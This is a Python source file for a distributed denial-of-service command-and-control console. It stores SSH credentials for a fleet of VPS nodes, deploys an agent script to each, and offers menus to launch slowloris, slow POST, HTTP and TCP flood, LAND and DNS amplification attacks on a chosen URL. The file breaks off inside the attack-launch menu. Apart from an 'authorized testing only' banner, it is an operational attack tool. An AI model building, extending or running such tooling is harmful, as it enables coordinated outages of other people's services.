#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Advanced Edition (Fixed Version)
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
import logging
import hashlib
import re
import ipaddress
import select
import argparse
import urllib.parse
from urllib.parse import urlparse
import ssl
import struct
import queue
import tempfile
import platform
import shutil
import traceback

# Try to import optional dependencies
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[WARNING] cryptography module not found. Password encryption will be limited.")

try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False
    print("[WARNING] paramiko module not found. SSH functionality will be limited.")

try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init(autoreset=True)
    COLOR_AVAILABLE = True
except ImportError:
    COLOR_AVAILABLE = False
    print("[WARNING] colorama module not found. Color output will be disabled.")

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("[WARNING] psutil module not found. System monitoring will be limited.")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[WARNING] requests module not found. Some network features will be limited.")

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("[WARNING] dnspython module not found. DNS features will be limited.")

# Ensure logs directory exists
os.makedirs("logs", exist_ok=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f"logs/slowhttp_c2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("SlowHTTP-C2")

# Version information
VERSION = "5.1.0-fixed"

# Color helper class
class Colors:
    """Terminal color codes"""
    if COLOR_AVAILABLE:
        RED = Fore.RED
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        BLUE = Fore.BLUE
        MAGENTA = Fore.MAGENTA
        CYAN = Fore.CYAN
        WHITE = Fore.WHITE
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
    else:
        RED = ""
        GREEN = ""
        YELLOW = ""
        BLUE = ""
        MAGENTA = ""
        CYAN = ""
        WHITE = ""
        RESET = ""
        BOLD = ""

class SecurityManager:
    """Enhanced security manager with robust encryption and validation"""
    
    def __init__(self):
        """Initialize security manager with encryption key"""
        self.key = None
        self.fernet = None
        self.initialize_encryption()
    
    def initialize_encryption(self):
        """Initialize encryption with Fernet or fallback to base64"""
        if CRYPTO_AVAILABLE:
            # Try to load key from file or create new one
            key_file = "config/encryption.key"
            os.makedirs(os.path.dirname(key_file), exist_ok=True)
            
            if os.path.exists(key_file):
                try:
                    with open(key_file, "rb") as f:
                        self.key = f.read()
                except Exception as e:
                    logger.error(f"Error reading encryption key: {str(e)}")
                    self.key = Fernet.generate_key()
            else:
                self.key = Fernet.generate_key()
                try:
                    with open(key_file, "wb") as f:
                        f.write(self.key)
                    os.chmod(key_file, 0o600)  # Secure permissions
                except Exception as e:
                    logger.error(f"Error saving encryption key: {str(e)}")
            
            self.fernet = Fernet(self.key)
        else:
            # Fallback to simple obfuscation with salt
            self.key = hashlib.sha256(socket.gethostname().encode()).digest()
    
    def encrypt_password(self, password):
        """Encrypt password using Fernet or fallback method"""
        if not password:
            return ""
            
        try:
            if CRYPTO_AVAILABLE and self.fernet:
                return self.fernet.encrypt(password.encode()).decode()
            else:
                # Fallback to simple obfuscation
                salted = password + socket.gethostname()
                return base64.b64encode(salted.encode()).decode()
        except Exception as e:
            logger.error(f"Encryption error: {str(e)}")
            # Return a marked version so we know it's not encrypted properly
            return f"ENCFAIL_{base64.b64encode(password.encode()).decode()}"
    
    def decrypt_password(self, encrypted_password):
        """Decrypt password using Fernet or fallback method"""
        if not encrypted_password:
            return ""
            
        try:
            if encrypted_password.startswith("ENCFAIL_"):
                # Handle failed encryption case
                encoded = encrypted_password[8:]  # Remove ENCFAIL_ prefix
                return base64.b64decode(encoded).decode()
                
            if CRYPTO_AVAILABLE and self.fernet:
                return self.fernet.decrypt(encrypted_password.encode()).decode()
            else:
                # Fallback from simple obfuscation
                decoded = base64.b64decode(encrypted_password.encode()).decode()
                hostname_len = len(socket.gethostname())
                return decoded[:-hostname_len] if hostname_len < len(decoded) else decoded
        except Exception as e:
            logger.error(f"Decryption error: {str(e)}")
            return ""
    
    def validate_ip_address(self, ip_address):
        """Validate IP address format"""
        try:
            ipaddress.ip_address(ip_address)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port):
        """Validate port number"""
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except ValueError:
            return False
    
    def validate_url(self, url):
        """Validate URL format"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False
    
    def sanitize_input(self, input_str):
        """Sanitize input to prevent injection attacks"""
        if not input_str:
            return ""
        
        # Remove potentially dangerous characters
        sanitized = re.sub(r'[;&|`$]', '', input_str)
        return sanitized
    
    def generate_random_string(self, length=12):
        """Generate a random string for various security purposes"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def hash_password(self, password, salt=None):
        """Create a secure hash of a password"""
        if not salt:
            salt = os.urandom(32)
        
        key = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            salt,
            100000
        )
        
        return salt + key
    
    def verify_password(self, stored_password, provided_password):
        """Verify a password against its hash"""
        salt = stored_password[:32]
        stored_key = stored_password[32:]
        
        new_key = hashlib.pbkdf2_hmac(
            'sha256',
            provided_password.encode('utf-8'),
            salt,
            100000
        )
        
        return new_key == stored_key

class SlowHTTPTUI:
    """Terminal User Interface for SlowHTTP C2 with improved error handling"""
    
    def __init__(self, db_manager, ssh_manager, attack_manager, network_tools):
        """Initialize TUI with required managers"""
        self.db_manager = db_manager
        self.ssh_manager = ssh_manager
        self.attack_manager = attack_manager
        self.network_tools = network_tools
        self.terminal = TerminalHelper()
        self.running = True
    
    def main_menu(self):
        """Display main menu"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner()
            
            options = [
                "VPS Management",
                "Launch Attack",
                "Monitor Attacks",
                "Attack History",
                "Network Tools",
                "System Status",
                "Settings",
                "Exit"
            ]
            
            choice = self.terminal.input_menu("MAIN MENU", options)
            
            if choice == 1:
                self.vps_management_menu()
            elif choice == 2:
                self.launch_attack_menu()
            elif choice == 3:
                self.monitor_attacks_menu()
            elif choice == 4:
                self.attack_history_menu()
            elif choice == 5:
                self.network_tools_menu()
            elif choice == 6:
                self.system_status_menu()
            elif choice == 7:
                self.settings_menu()
            elif choice == 8 or choice == 0:
                if self.terminal.confirm_action("Are you sure you want to exit?"):
                    self.running = False
                    break
    
    def vps_management_menu(self):
        """VPS management menu"""
        while True:
            self.terminal.clear_screen()
            self.terminal.print_header("VPS MANAGEMENT")
            
            # Get all VPS
            vps_list = self.db_manager.get_all_vps()
            
            # Display VPS table
            if vps_list:
                headers = ["ID", "Name", "IP Address", "Status", "Last Seen"]
                data = []
                
                for vps in vps_list:
                    status_str = vps['status']
                    if status_str == 'online':
                        status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
                    elif status_str == 'offline':
                        status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
                    else:
                        status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
                    
                    last_seen = vps['last_seen'] if vps['last_seen'] else "Never"
                    
                    data.append([
                        vps['id'],
                        vps['name'],
                        vps['ip_address'],
                        status_str,
                        last_seen
                    ])
                
                self.terminal.print_table(headers, data)
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes found. Add a new VPS to get started.{Colors.RESET}")
            
            print("\nOptions:")
            print("1. Add new VPS")
            print("2. Edit VPS")
            print("3. Delete VPS")
            print("4. Test Connection")
            print("5. Deploy Agent")
            print("0. Back to Main Menu")
            
            try:
                choice = int(input("\nEnter your choice: "))
                
                if choice == 1:
                    self.add_vps()
                elif choice == 2:
                    self.edit_vps()
                elif choice == 3:
                    self.delete_vps()
                elif choice == 4:
                    self.test_vps_connection()
                elif choice == 5:
                    self.deploy_agent()
                elif choice == 0:
                    break
                else:
                    print(f"{Colors.RED}Invalid choice. Please try again.{Colors.RESET}")
                    time.sleep(1)
            except ValueError:
                print(f"{Colors.RED}Please enter a number.{Colors.RESET}")
                time.sleep(1)
    
    def add_vps(self):
        """Add a new VPS"""
        self.terminal.clear_screen()
        self.terminal.print_header("ADD NEW VPS")
        
        print("\nOptions:")
        print("1. Add Single VPS")
        print("2. Bulk Add VPS")
        print("0. Back")
        
        try:
            choice = int(input("\nEnter your choice: "))
            
            if choice == 1:
                self._add_single_vps()
            elif choice == 2:
                self._add_bulk_vps()
            elif choice == 0:
                return
            else:
                print(f"{Colors.RED}Invalid choice. Please try again.{Colors.RESET}")
                time.sleep(1)
                self.add_vps()
                
        except ValueError:
            print(f"{Colors.RED}Please enter a number.{Colors.RESET}")
            time.sleep(1)
            self.add_vps()
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def _add_single_vps(self):
        """Add a single VPS"""
        self.terminal.clear_screen()
        self.terminal.print_header("ADD SINGLE VPS")
        
        try:
            name = self.terminal.input_with_validation(
                "Enter VPS name",
                lambda x: len(x) > 0,
                "Name cannot be empty"
            )
            
            ip_address = self.terminal.input_with_validation(
                "Enter IP address",
                lambda x: self.db_manager.security.validate_ip_address(x),
                "Invalid IP address format"
            )
            
            username = self.terminal.input_with_validation(
                "Enter SSH username",
                lambda x: len(x) > 0,
                "Username cannot be empty"
            )
            
            password = self.terminal.input_with_validation(
                "Enter SSH password",
                None,
                None,
                password=True
            )
            
            ssh_port = self.terminal.input_with_validation(
                "Enter SSH port",
                lambda x: self.db_manager.security.validate_port(x),
                "Invalid port number",
                default="22"
            )
            
            print(f"\n{Colors.CYAN}Adding VPS...{Colors.RESET}")
            
            try:
                vps_id = self.db_manager.add_vps(name, ip_address, username, password, int(ssh_port))
                print(f"\n{Colors.GREEN}VPS added successfully with ID: {vps_id}{Colors.RESET}")
                
                # Test connection
                if self.terminal.confirm_action("Test connection now?", default=True):
                    print(f"\n{Colors.CYAN}Testing connection...{Colors.RESET}")
                    success, message = self.ssh_manager.connect_vps(ip_address, username, password, int(ssh_port))
                    
                    if success:
                        print(f"\n{Colors.GREEN}Connection successful!{Colors.RESET}")
                        self.db_manager.update_vps_status(ip_address, 'online')
                        
                        # Deploy agent
                        if self.terminal.confirm_action("Deploy agent script now?", default=True):
                            print(f"\n{Colors.CYAN}Deploying agent script...{Colors.RESET}")
                            if self.attack_manager._deploy_agent_script(ip_address):
                                print(f"\n{Colors.GREEN}Agent script deployed successfully!{Colors.RESET}")
                            else:
                                print(f"\n{Colors.RED}Failed to deploy agent script.{Colors.RESET}")
                    else:
                        print(f"\n{Colors.RED}Connection failed: {message}{Colors.RESET}")
                        self.db_manager.update_vps_status(ip_address, 'offline')
            except Exception as e:
                print(f"\n{Colors.RED}Error adding VPS: {str(e)}{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def _add_bulk_vps(self):
        """Add multiple VPS in bulk"""
        self.terminal.clear_screen()
        self.terminal.print_header("BULK ADD VPS")
        
        print(f"\n{Colors.CYAN}Bulk VPS Addition{Colors.RESET}")
        print("Enter multiple VPS entries in the following format:")
        print("name,ip_address,username,password,ssh_port")
        print("One entry per line. SSH port is optional (default: 22).")
        print("Example:")
        print("vps1,192.168.1.1,root,password,22")
        print("vps2,192.168.1.2,admin,password")
        print("\nEnter a blank line when finished.")
        
        entries = []
        while True:
            line = input("> ").strip()
            if not line:
                break
            entries.append(line)
        
        if not entries:
            print(f"\n{Colors.YELLOW}No entries provided.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        # Process entries
        print(f"\n{Colors.CYAN}Processing {len(entries)} VPS entries...{Colors.RESET}")
        
        success_count = 0
        failed_entries = []
        
        for i, entry in enumerate(entries):
            parts = entry.split(',')
            
            # Validate entry format
            if len(parts) < 4 or len(parts) > 5:
                failed_entries.append((entry, "Invalid format"))
                continue
            
            # Extract fields
            if len(parts) == 4:
                name, ip_address, username, password = parts
                ssh_port = 22
            else:
                name, ip_address, username, password, ssh_port_str = parts
                try:
                    ssh_port = int(ssh_port_str)
                    if not (1 <= ssh_port <= 65535):
                        failed_entries.append((entry, "Invalid SSH port"))
                        continue
                except ValueError:
                    failed_entries.append((entry, "Invalid SSH port"))
                    continue
            
            # Validate IP address
            if not self.db_manager.security.validate_ip_address(ip_address):
                failed_entries.append((entry, "Invalid IP address"))
                continue
            
            # Add VPS
            try:
                print(f"Adding VPS {i+1}/{len(entries)}: {name} ({ip_address})... ", end="", flush=True)
                vps_id = self.db_manager.add_vps(name, ip_address, username, password, ssh_port)
                print(f"{Colors.GREEN}Success{Colors.RESET}")
                success_count += 1
            except Exception as e:
                print(f"{Colors.RED}Failed{Colors.RESET}")
                failed_entries.append((entry, str(e)))
        
        # Summary
        print(f"\n{Colors.GREEN}Successfully added {success_count}/{len(entries)} VPS nodes.{Colors.RESET}")
        
        if failed_entries:
            print(f"\n{Colors.RED}Failed entries:{Colors.RESET}")
            for entry, reason in failed_entries:
                print(f"  - {entry}: {reason}")
        
        # Ask to test connections
        if success_count > 0 and self.terminal.confirm_action("\nTest connections to added VPS nodes?", default=True):
            self._test_bulk_connections()
        
        input("\nPress Enter to continue...")
    
    def _test_bulk_connections(self):
        """Test connections to all VPS nodes with offline status"""
        self.terminal.clear_screen()
        self.terminal.print_header("TEST CONNECTIONS")
        
        # Get all VPS with offline status
        vps_list = self.db_manager.get_all_vps()
        offline_vps = [vps for vps in vps_list if vps['status'] == 'offline']
        
        if not offline_vps:
            print(f"\n{Colors.YELLOW}No offline VPS nodes found.{Colors.RESET}")
            return
        
        print(f"\n{Colors.CYAN}Testing connections to {len(offline_vps)} VPS nodes...{Colors.RESET}")
        
        success_count = 0
        deploy_count = 0
        
        for i, vps in enumerate(offline_vps):
            print(f"\n[{i+1}/{len(offline_vps)}] Testing connection to {vps['name']} ({vps['ip_address']})... ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(
                vps['ip_address'],
                vps['username'],
                vps['password'],
                vps['ssh_port']
            )
            
            if success:
                print(f"{Colors.GREEN}Connected{Colors.RESET}")
                self.db_manager.update_vps_status(vps['ip_address'], 'online')
                success_count += 1
                
                # Check if agent script exists
                cmd = "if [ -f ~/slowhttp_agent/agent.py ]; then echo 'exists'; else echo 'not_exists'; fi"
                agent_success, agent_status = self.ssh_manager.execute_command(vps['ip_address'], cmd)
                
                if agent_success and agent_status.strip() == 'exists':
                    print(f"  Agent script: {Colors.GREEN}Already installed{Colors.RESET}")
                else:
                    print(f"  Agent script: {Colors.YELLOW}Not installed{Colors.RESET}")
                    print(f"  Deploying agent script... ", end="", flush=True)
                    
                    if self.attack_manager._deploy_agent_script(vps['ip_address']):
                        print(f"{Colors.GREEN}Success{Colors.RESET}")
                        deploy_count += 1
                    else:
                        print(f"{Colors.RED}Failed{Colors.RESET}")
            else:
                print(f"{Colors.RED}Failed: {message}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}Successfully connected to {success_count}/{len(offline_vps)} VPS nodes.{Colors.RESET}")
        if deploy_count > 0:
            print(f"{Colors.GREEN}Successfully deployed agent script to {deploy_count} VPS nodes.{Colors.RESET}")
        
        return success_count
    
    def edit_vps(self):
        """Edit an existing VPS"""
        self.terminal.clear_screen()
        self.terminal.print_header("EDIT VPS")
        
        # Get all VPS
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"\n{Colors.YELLOW}No VPS nodes found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        # Display VPS table
        headers = ["ID", "Name", "IP Address", "Status"]
        data = []
        
        for vps in vps_list:
            status_str = vps['status']
            if status_str == 'online':
                status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
            elif status_str == 'offline':
                status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
            else:
                status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
            
            data.append([
                vps['id'],
                vps['name'],
                vps['ip_address'],
                status_str
            ])
        
        self.terminal.print_table(headers, data)
        
        try:
            vps_id = int(input("\nEnter VPS ID to edit (0 to cancel): "))
            
            if vps_id == 0:
                return
            
            # Get VPS details
            vps = self.db_manager.get_vps(vps_id)
            
            if not vps:
                print(f"\n{Colors.RED}VPS not found.{Colors.RESET}")
                input("\nPress Enter to continue...")
                return
            
            self.terminal.clear_screen()
            self.terminal.print_header(f"EDIT VPS: {vps['name']}")
            
            print(f"Current values are shown in brackets. Press Enter to keep current value.")
            
            name = self.terminal.input_with_validation(
                "Enter VPS name",
                lambda x: len(x) > 0 if x else True,
                "Name cannot be empty",
                default=vps['name']
            )
            
            ip_address = self.terminal.input_with_validation(
                "Enter IP address",
                lambda x: self.db_manager.security.validate_ip_address(x) if x else True,
                "Invalid IP address format",
                default=vps['ip_address']
            )
            
            username = self.terminal.input_with_validation(
                "Enter SSH username",
                lambda x: len(x) > 0 if x else True,
                "Username cannot be empty",
                default=vps['username']
            )
            
            password = self.terminal.input_with_validation(
                "Enter SSH password (leave empty to keep current)",
                None,
                None,
                password=True
            )
            
            if not password:
                password = None  # Don't update password
            
            ssh_port = self.terminal.input_with_validation(
                "Enter SSH port",
                lambda x: self.db_manager.security.validate_port(x) if x else True,
                "Invalid port number",
                default=str(vps['ssh_port'])
            )
            
            if ssh_port:
                ssh_port = int(ssh_port)
            else:
                ssh_port = None  # Don't update port
            
            print(f"\n{Colors.CYAN}Updating VPS...{Colors.RESET}")
            
            try:
                self.db_manager.update_vps(vps_id, name, ip_address, username, password, ssh_port)
                print(f"\n{Colors.GREEN}VPS updated successfully!{Colors.RESET}")
                
                # Test connection
                if self.terminal.confirm_action("Test connection now?", default=True):
                    print(f"\n{Colors.CYAN}Testing connection...{Colors.RESET}")
                    
                    # Get updated VPS details
                    updated_vps = self.db_manager.get_vps(vps_id)
                    
                    success, message = self.ssh_manager.connect_vps(
                        updated_vps['ip_address'],
                        updated_vps['username'],
                        updated_vps['password'],
                        updated_vps['ssh_port']
                    )
                    
                    if success:
                        print(f"\n{Colors.GREEN}Connection successful!{Colors.RESET}")
                        self.db_manager.update_vps_status(updated_vps['ip_address'], 'online')
                    else:
                        print(f"\n{Colors.RED}Connection failed: {message}{Colors.RESET}")
                        self.db_manager.update_vps_status(updated_vps['ip_address'], 'offline')
            except Exception as e:
                print(f"\n{Colors.RED}Error updating VPS: {str(e)}{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except ValueError:
            print(f"\n{Colors.RED}Please enter a valid ID.{Colors.RESET}")
            input("\nPress Enter to continue...")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def delete_vps(self):
        """Delete a VPS"""
        self.terminal.clear_screen()
        self.terminal.print_header("DELETE VPS")
        
        # Get all VPS
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"\n{Colors.YELLOW}No VPS nodes found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        # Display VPS table
        headers = ["ID", "Name", "IP Address", "Status"]
        data = []
        
        for vps in vps_list:
            status_str = vps['status']
            if status_str == 'online':
                status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
            elif status_str == 'offline':
                status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
            else:
                status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
            
            data.append([
                vps['id'],
                vps['name'],
                vps['ip_address'],
                status_str
            ])
        
        self.terminal.print_table(headers, data)
        
        try:
            vps_id = int(input("\nEnter VPS ID to delete (0 to cancel): "))
            
            if vps_id == 0:
                return
            
            # Get VPS details
            vps = self.db_manager.get_vps(vps_id)
            
            if not vps:
                print(f"\n{Colors.RED}VPS not found.{Colors.RESET}")
                input("\nPress Enter to continue...")
                return
            
            # Confirm deletion
            if self.terminal.confirm_action(f"Are you sure you want to delete VPS '{vps['name']}' ({vps['ip_address']})?"):
                print(f"\n{Colors.CYAN}Deleting VPS...{Colors.RESET}")
                
                try:
                    # Disconnect if connected
                    self.ssh_manager.disconnect_vps(vps['ip_address'])
                    
                    # Delete from database
                    self.db_manager.delete_vps(vps_id)
                    
                    print(f"\n{Colors.GREEN}VPS deleted successfully!{Colors.RESET}")
                except Exception as e:
                    print(f"\n{Colors.RED}Error deleting VPS: {str(e)}{Colors.RESET}")
            else:
                print(f"\n{Colors.YELLOW}Deletion cancelled.{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except ValueError:
            print(f"\n{Colors.RED}Please enter a valid ID.{Colors.RESET}")
            input("\nPress Enter to continue...")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def test_vps_connection(self):
        """Test connection to a VPS"""
        self.terminal.clear_screen()
        self.terminal.print_header("TEST VPS CONNECTION")
        
        # Get all VPS
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"\n{Colors.YELLOW}No VPS nodes found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        # Display VPS table
        headers = ["ID", "Name", "IP Address", "Status"]
        data = []
        
        for vps in vps_list:
            status_str = vps['status']
            if status_str == 'online':
                status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
            elif status_str == 'offline':
                status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
            else:
                status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
            
            data.append([
                vps['id'],
                vps['name'],
                vps['ip_address'],
                status_str
            ])
        
        self.terminal.print_table(headers, data)
        
        try:
            vps_id = int(input("\nEnter VPS ID to test (0 to cancel): "))
            
            if vps_id == 0:
                return
            
            # Get VPS details
            vps = self.db_manager.get_vps(vps_id)
            
            if not vps:
                print(f"\n{Colors.RED}VPS not found.{Colors.RESET}")
                input("\nPress Enter to continue...")
                return
            
            print(f"\n{Colors.CYAN}Testing connection to {vps['name']} ({vps['ip_address']})...{Colors.RESET}")
            
            try:
                success, message = self.ssh_manager.connect_vps(
                    vps['ip_address'],
                    vps['username'],
                    vps['password'],
                    vps['ssh_port']
                )
                
                if success:
                    print(f"\n{Colors.GREEN}Connection successful!{Colors.RESET}")
                    self.db_manager.update_vps_status(vps['ip_address'], 'online')
                    
                    # Get system info
                    print(f"\n{Colors.CYAN}Getting system information...{Colors.RESET}")
                    
                    # Get CPU info
                    cmd = "cat /proc/cpuinfo | grep 'model name' | head -1 | awk -F: '{print $2}'"
                    cpu_success, cpu_info = self.ssh_manager.execute_command(vps['ip_address'], cmd)
                    
                    # Get memory info
                    cmd = "free -m | grep Mem | awk '{print $2}'"
                    mem_success, mem_info = self.ssh_manager.execute_command(vps['ip_address'], cmd)
                    
                    # Get disk info
                    cmd = "df -h / | tail -1 | awk '{print $2}'"
                    disk_success, disk_info = self.ssh_manager.execute_command(vps['ip_address'], cmd)
                    
                    # Get OS info
                    cmd = "cat /etc/os-release | grep PRETTY_NAME | awk -F= '{print $2}' | tr -d '&quot;'"
                    os_success, os_info = self.ssh_manager.execute_command(vps['ip_address'], cmd)
                    
                    print("\nSystem Information:")
                    print(f"CPU: {cpu_info.strip() if cpu_success else 'Unknown'}")
                    print(f"Memory: {mem_info.strip() if mem_success else 'Unknown'} MB")
                    print(f"Disk: {disk_info.strip() if disk_success else 'Unknown'}")
                    print(f"OS: {os_info.strip() if os_success else 'Unknown'}")
                    
                    # Check if agent script exists
                    cmd = "if [ -f ~/slowhttp_agent/agent.py ]; then echo 'exists'; else echo 'not_exists'; fi"
                    agent_success, agent_status = self.ssh_manager.execute_command(vps['ip_address'], cmd)
                    
                    if agent_success and agent_status.strip() == 'exists':
                        print(f"\n{Colors.GREEN}Agent script is installed.{Colors.RESET}")
                    else:
                        print(f"\n{Colors.YELLOW}Agent script is not installed.{Colors.RESET}")
                        
                        # Ask to deploy agent
                        if self.terminal.confirm_action("Deploy agent script now?", default=True):
                            print(f"\n{Colors.CYAN}Deploying agent script...{Colors.RESET}")
                            if self.attack_manager._deploy_agent_script(vps['ip_address']):
                                print(f"\n{Colors.GREEN}Agent script deployed successfully!{Colors.RESET}")
                            else:
                                print(f"\n{Colors.RED}Failed to deploy agent script.{Colors.RESET}")
                else:
                    print(f"\n{Colors.RED}Connection failed: {message}{Colors.RESET}")
                    self.db_manager.update_vps_status(vps['ip_address'], 'offline')
            except Exception as e:
                print(f"\n{Colors.RED}Error testing connection: {str(e)}{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except ValueError:
            print(f"\n{Colors.RED}Please enter a valid ID.{Colors.RESET}")
            input("\nPress Enter to continue...")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def deploy_agent(self):
        """Deploy agent script to a VPS"""
        self.terminal.clear_screen()
        self.terminal.print_header("DEPLOY AGENT SCRIPT")
        
        # Get all VPS
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"\n{Colors.YELLOW}No VPS nodes found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        # Display VPS table
        headers = ["ID", "Name", "IP Address", "Status"]
        data = []
        
        for vps in vps_list:
            status_str = vps['status']
            if status_str == 'online':
                status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
            elif status_str == 'offline':
                status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
            else:
                status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
            
            data.append([
                vps['id'],
                vps['name'],
                vps['ip_address'],
                status_str
            ])
        
        self.terminal.print_table(headers, data)
        
        try:
            vps_id = int(input("\nEnter VPS ID to deploy agent (0 to cancel): "))
            
            if vps_id == 0:
                return
            
            # Get VPS details
            vps = self.db_manager.get_vps(vps_id)
            
            if not vps:
                print(f"\n{Colors.RED}VPS not found.{Colors.RESET}")
                input("\nPress Enter to continue...")
                return
            
            print(f"\n{Colors.CYAN}Deploying agent script to {vps['name']} ({vps['ip_address']})...{Colors.RESET}")
            
            try:
                # Check connection first
                if not self.ssh_manager.get_connection_status(vps['ip_address']):
                    print(f"\n{Colors.YELLOW}Not connected. Attempting to connect...{Colors.RESET}")
                    success, message = self.ssh_manager.connect_vps(
                        vps['ip_address'],
                        vps['username'],
                        vps['password'],
                        vps['ssh_port']
                    )
                    
                    if not success:
                        print(f"\n{Colors.RED}Connection failed: {message}{Colors.RESET}")
                        input("\nPress Enter to continue...")
                        return
                
                # Deploy agent script
                if self.attack_manager._deploy_agent_script(vps['ip_address']):
                    print(f"\n{Colors.GREEN}Agent script deployed successfully!{Colors.RESET}")
                else:
                    print(f"\n{Colors.RED}Failed to deploy agent script.{Colors.RESET}")
            except Exception as e:
                print(f"\n{Colors.RED}Error deploying agent: {str(e)}{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except ValueError:
            print(f"\n{Colors.RED}Please enter a valid ID.{Colors.RESET}")
            input("\nPress Enter to continue...")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def launch_attack_menu(self):
        """Launch attack menu"""
        self.terminal.clear_screen()
        self.terminal.print_header("LAUNCH ATTACK")
        
        # Get online VPS
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps['status'] == 'online']
        
        if not online_vps:
            print(f"\n{Colors.YELLOW}No online VPS nodes found. Please add and connect to VPS nodes first.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        # Display online VPS
        headers = ["ID", "Name", "IP Address"]
        data = []
        
        for vps in online_vps:
            data.append([
                vps['id'],
                vps['name'],
                vps['ip_address']
            ])
        
        print(f"\n{Colors.CYAN}Available VPS Nodes:{Colors.RESET}")
        self.terminal.print_table(headers, data)
        
        try:
            # Get attack parameters
            print(f"\n{Colors.CYAN}Attack Configuration:{Colors.RESET}")
            
            session_name = self.terminal.input_with_validation(
                "Enter attack session name",
                lambda x: len(x) > 0,
                "Session name cannot be empty"
            )
            
            target_url = self.terminal.input_with_validation(
                "Enter target URL (e.g., http://example.com)",
                lambda x: self.db_manager.security.validate_url(x),
                "Invalid URL format"
            )
            
            # Parse URL to get host
            parsed_url = urlparse(target_url)
            target_host = parsed_url.netloc
            
            # Select attack type
            attack_types = [
                "slowloris - Slowloris (Keep-Alive)",
                "slow_post - Slow POST (R.U.D.Y)",
                "slow_read - Slow Read",
                "http_flood - HTTP Flood",
                "ssl_exhaust - SSL Exhaustion",
                "tcp_flood - TCP Flood",
                "land - LAND Attack",
                "dns_amplification - DNS Amplification"
            ]
            
            print("\nAvailable attack types:")
            for i, attack_type in enumerate(attack_types, 1):
                print(f"{i}. {attack_type}")
            
            attack_choice = self.terminal.input_with_validation(
                "Select attack type (1-8)",
                lambda x: x.isdigit() and 1 <= int(x) <= 8,
                "Invalid choice"
            )
            
            attack_type = attack_types[int(attack_choice) - 1].split(" - ")[0]
            
            # Get attack parameters
            connections = self.terminal.input_with_validation(
                "Enter number of connections per VPS",
                lambda x: x.isdigit() and int(x) > 0,
                "Must be a positive number",
                default="150"
            )
            
            # Duration options
